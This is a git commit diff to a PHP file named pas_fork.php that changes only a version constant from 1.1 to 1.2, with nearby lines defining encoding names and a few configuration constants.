3f29271db1d5d3461f5771e12ae971ecf928515e
cr1f <35085741+cr1f@users.noreply.github.com>
2023-04-19 18:11:09 +0300

    Update pas_fork.php

--- pas_fork.php
+++ pas_fork.php
@@ -554,7 +554,7 @@ else{
 
 $C = array(''=>'UTF-8','UTF-16','Windows-1250','Windows-1251','Windows-1252','Windows-1254','Windows-1256','Windows-1257','ISO-8859-1','ISO-8859-2','ISO-8859-7','ISO-8859-8','ISO-8859-9','ISO-8859-13','Big5','GBK','Shift_JIS','EUC-KR','EUC-JP','IBM866','KOI8-R','KOI8-U',);
 
-define('VER', '1.1');
+define('VER', '1.2');
 define('DSC', DIRECTORY_SEPARATOR);
 define('NIX', DSC === '/');
 define('RO', isset($D['ro']) ? true : false);
